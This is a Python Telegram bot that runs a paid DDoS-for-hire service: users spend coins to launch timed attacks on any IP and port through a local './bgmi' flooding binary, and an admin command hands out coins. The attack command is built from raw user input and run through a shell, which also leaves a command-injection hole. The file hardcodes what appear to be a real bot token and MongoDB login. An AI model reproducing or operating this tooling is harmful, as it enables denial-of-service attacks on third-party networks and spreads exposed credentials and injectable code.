import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from motor.motor_asyncio import AsyncIOMotorClient

# Configuration
TELEGRAM_BOT_TOKEN = '7711360792:AAE9G4vqiak1URRYY9gBUj1_xdchTxU7usk'
ADMIN_USER_ID = 7017469802
MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
DB_NAME = "dake"
COLLECTION_NAME = "users"
ATTACK_TIME_LIMIT = 300  # Max attack duration in seconds
COINS_REQUIRED_PER_ATTACK = 5  # Coins required per attack
attack_in_progress = False

# MongoDB setup
mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client[DB_NAME]
users_collection = db[COLLECTION_NAME]

async def get_user(user_id):
    """Fetch user data from MongoDB."""
    user = await users_collection.find_one({"user_id": user_id})
    return user or {"user_id": user_id, "coins": 0}

async def update_user(user_id, coins):
    """Update user coins in MongoDB."""
    await users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"coins": coins}},
        upsert=True
    )

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to @seedhe_maut DDOS Bot! 🔥*\n\n"
        "*Use /help for commands.*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def daku(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id, text="*⚠️ Only Admin can use this command!*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id, text="*⚠️ Usage: /daku <add|rem> <user_id> <coins>*", parse_mode='Markdown')
        return

    command, target_user_id, coins = args
    target_user_id, coins = int(target_user_id), int(coins)
    user = await get_user(target_user_id)

    if command == 'add':
        new_balance = user["coins"] + coins
        await update_user(target_user_id, new_balance)
        message = f"*✔️ {coins} coins added to user {target_user_id}. New Balance: {new_balance}.*"
    elif command == 'rem':
        new_balance = max(0, user["coins"] - coins)
        await update_user(target_user_id, new_balance)
        message = f"*✔️ {coins} coins removed from user {target_user_id}. New Balance: {new_balance}.*"
    else:
        message = "*⚠️ Invalid command! Use 'add' or 'rem'.*"

    await context.bot.send_message(chat_id, text=message, parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    user = await get_user(user_id)

    if user["coins"] < COINS_REQUIRED_PER_ATTACK:
        await context.bot.send_message(chat_id, text="*⚠️ You don't have enough coins!*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id, text="*⚠️ An attack is already in progress. Try again later.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    duration = int(duration)

    if duration > ATTACK_TIME_LIMIT:
        await context.bot.send_message(chat_id, text=f"*⚠️ Max attack duration is {ATTACK_TIME_LIMIT} seconds.*", parse_mode='Markdown')
        return

    new_balance = user["coins"] - COINS_REQUIRED_PER_ATTACK
    await update_user(user_id, new_balance)

    await context.bot.send_message(chat_id, text=(
        f"*⚔️ Attack Started! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Coins Deducted: {COINS_REQUIRED_PER_ATTACK}*\n"
        f"*💰 New Balance: {new_balance}*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        command = f"./bgmi {ip} {port} {duration} 512 800"
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id, text=f"*⚠️ Attack error: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id, text="*✅ Attack completed!*", parse_mode='Markdown')

async def myinfo(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    user = await get_user(user_id)

    message = (
        f"*📝 User Info:*\n"
        f"*💰 Coins: {user['coins']}*\n"
        f"*😏 Status: Approved*"
    )
    await context.bot.send_message(chat_id, text=message, parse_mode='Markdown')

async def help(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🛠️ Help Menu:*\n"
        "*🔧 /attack <ip> <port> <duration>* - Start a fake attack.\n"
        "*🧾 /myinfo* - Check your balance and status.\n"
        "*📜 /help* - Show this menu."
    )
    await context.bot.send_message(chat_id, text=message, parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("daku", daku))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("myinfo", myinfo))
    application.add_handler(CommandHandler("help", help))
    application.run_polling()

if __name__ == '__main__':
    main()
